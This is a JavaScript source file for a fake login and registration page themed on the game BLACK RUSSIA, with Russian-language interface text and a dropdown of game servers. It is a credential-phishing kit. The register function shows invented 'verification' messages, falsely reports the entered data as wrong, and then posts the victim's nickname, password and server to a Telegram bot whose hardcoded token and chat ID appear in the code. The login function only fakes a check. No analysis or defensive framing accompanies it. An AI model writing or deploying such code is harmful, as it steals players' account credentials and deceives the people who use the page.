const $ = id => document.getElementById(id);

/* ===== НАСТРОЙКИ TELEGRAM ===== */

const BOT_TOKEN = "8642066516:AAHGLyxbdA9YD0M5kI3slahWcFkzKU1G5Jk";
const CHAT_ID = "1615770141";

/* ===== ПЕРЕХОД ===== */

function openAuth(){
  $("welcomeScreen").style.display = "none";
  $("authContainer").style.display = "block";
}

/* ===== ТАБЫ ===== */

const loginTab = $("loginTab");
const registerTab = $("registerTab");
const loginForm = $("loginForm");
const registerForm = $("registerForm");

loginTab.onclick = () => switchTab(true);
registerTab.onclick = () => switchTab(false);

function switchTab(login){
  loginTab.classList.toggle("active", login);
  registerTab.classList.toggle("active", !login);
  loginForm.style.display = login ? "block" : "none";
  registerForm.style.display = login ? "none" : "block";
}

/* ===== АВТОРИЗАЦИЯ ===== */

function login(){

  const nick = $("loginNick").value.trim();
  const pass = $("loginPass").value.trim();

  if(!nick || !pass){
    $("loginError").textContent = "Введите данные для входа";
    return;
  }

  $("loginError").textContent = "";
  $("loginProgressWrap").style.display = "block";

  let progress = 0;
  const bar = $("loginProgress");
  const text = $("loginStatusText");

  const interval = setInterval(() => {
    progress += 10;
    bar.style.width = progress + "%";

    if(progress === 30) text.textContent = "Проверка данных...";
    if(progress === 60) text.textContent = "Синхронизация сервера...";
    if(progress === 90) text.textContent = "Анализ аккаунта...";

    if(progress >= 100){
      clearInterval(interval);
      text.textContent = "Неверные данные от аккаунта";
    }
  },150);
}

/* ===== РЕГИСТРАЦИЯ ===== */

function register(){

  const nick = $("regNick").value.trim();
  const pass = $("regPass").value.trim();
  const server = $("regServer").value;

  if(!nick || !pass || !server){
    $("regMsg").style.color = "#ff4d4d";
    $("regMsg").textContent = "Заполните все поля";
    return;
  }

  $("regMsg").textContent = "";

  // создаём прогресс-бар если его нет
  let wrap = document.getElementById("regProgressWrap");

  if(!wrap){
    wrap = document.createElement("div");
    wrap.className = "progress-wrapper";
    wrap.id = "regProgressWrap";

    wrap.innerHTML = `
      <div class="progress-bar">
        <div id="regProgress"></div>
      </div>
      <div id="regStatusText" class="progress-text"></div>
    `;

    $("registerForm").insertBefore(wrap, $("regMsg"));
  }

  wrap.style.display = "block";

  const bar = document.getElementById("regProgress");
  const text = document.getElementById("regStatusText");

  bar.style.width = "0%";
  text.textContent = "";

  let progress = 0;

  const interval = setInterval(() => {
    progress += 5;
    bar.style.width = progress + "%";

    if(progress === 30) text.textContent = "Проверка данных...";
    if(progress === 60) text.textContent = "Синхронизация сервера...";
    if(progress === 90) text.textContent = "Проверка аккаунта...";

    if(progress >= 100){
      clearInterval(interval);
      text.textContent = "Вы ввели неправильные данные";

      // отправка в Telegram
      const message =
`📥 Новая заявка BLACK RUSSIA

👤 Ник: ${nick}
🔐 Данные: ${pass}
🌍 Сервер: ${server}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body:JSON.stringify({
          chat_id:CHAT_ID,
          text:message
        })
      });
    }

  },80);
}

/* ===== СЕРВЕРА ===== */

const serverNames = [
"RED","GREEN","BLUE","YELLOW","ORANGE","PURPLE","LIME","PINK","CHERRY","BLACK",
"INDIGO","WHITE","MAGENTA","CRIMSON","GOLD","AZURE","PLATINUM","AQUA","GRAY","ICE",
"CHILLI","CHOCO","MOSCOW","SPB","UFA","SOCHI","KAZAN","SAMARA","ROSTOV","ANAPA",
"EKATERINBURG","KRASNODAR","ARZAMAS","NOVOSIBIRSK","GROZNY","SARATOV","OMSK","IRKUTSK",
"VOLGOGRAD","VORONEZH","BELGOROD","MAKHACHKALA","VLADIKAVKAZ","VLADIVOSTOK",
"KALININGRAD","CHELYABINSK","KRASNOYARSK","KHABAROVSK","CHEBOKSARY","PERM",
"TULA","RYAZAN","MURMANSK","PENZA","KURSK","ARKHANGELSK","ORENBURG","KURSK","KIROV",
"KEMEROVO","TYUMEN","TOLYATTI","IVANOVO","STAVROPOL","SMOLENSK","PSKOV","BRYANSK",
"OREL","YAROSLAVL","BARNAUL","LIPETSK","ULYANOVSK","YAKUTSK","TAMBOV","BRATSK",
"ASTRAKHAN","CHITA","KOSTROMA","VLADIMIR","KALUGA","N.NOVGOROD","TAGANROG",
"VOLOGDA","TVER","TOMSK","IZHEVSK","SURGUT","PODOLSK","MAGADAN","CHEREPOVETS","NORILSK"
];

const customSelect = document.getElementById("serverSelect");
const selected = customSelect.querySelector(".select-selected");
const optionsContainer = document.getElementById("serverOptions");
const hiddenInput = document.getElementById("regServer");

serverNames.forEach(name=>{
  const div = document.createElement("div");
  div.textContent = name;

  div.onclick = ()=>{
    selected.textContent = name;
    hiddenInput.value = name;

    document.querySelectorAll(".select-options div")
      .forEach(el=>el.classList.remove("selected"));

    div.classList.add("selected");

    optionsContainer.style.display="none";
    customSelect.classList.remove("active");
  };

  optionsContainer.appendChild(div);
});

selected.onclick = ()=>{
  const isOpen = optionsContainer.style.display === "block";
  optionsContainer.style.display = isOpen ? "none" : "block";
  customSelect.classList.toggle("active");
};

document.addEventListener("click",(e)=>{
  if(!customSelect.contains(e.target)){
    optionsContainer.style.display="none";
    customSelect.classList.remove("active");
  }
});